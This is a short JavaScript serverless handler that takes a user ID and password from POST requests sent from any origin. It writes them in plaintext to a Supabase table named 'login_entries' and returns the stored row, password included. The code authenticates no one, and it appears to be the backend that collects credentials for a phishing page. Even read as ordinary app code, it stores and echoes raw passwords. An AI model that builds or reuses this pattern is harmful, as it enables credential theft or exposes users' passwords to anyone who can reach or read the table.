import { createClient } from "@supabase/supabase-js";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    if (!process.env.SUPABASE_URL || !process.env.SUPABASE_PUBLISHABLE_KEY) {
      return res.status(500).json({
        error: "Missing SUPABASE_URL or SUPABASE_PUBLISHABLE_KEY"
      });
    }

    const supabase = createClient(
      process.env.SUPABASE_URL,
      process.env.SUPABASE_PUBLISHABLE_KEY
    );

    const { user_id, pass } = req.body;

    if (!user_id || !pass) {
      return res.status(400).json({ error: "Missing user_id or pass" });
    }

    const { data, error } = await supabase
      .from("login_entries")
      .insert([{ user_id, pass }])
      .select();

    if (error) {
      return res.status(500).json({ error: error.message });
    }

    return res.status(200).json({ success: true, data });
  } catch (err) {
    return res.status(500).json({
      error: err.message || "Unknown server error"
    });
  }
}
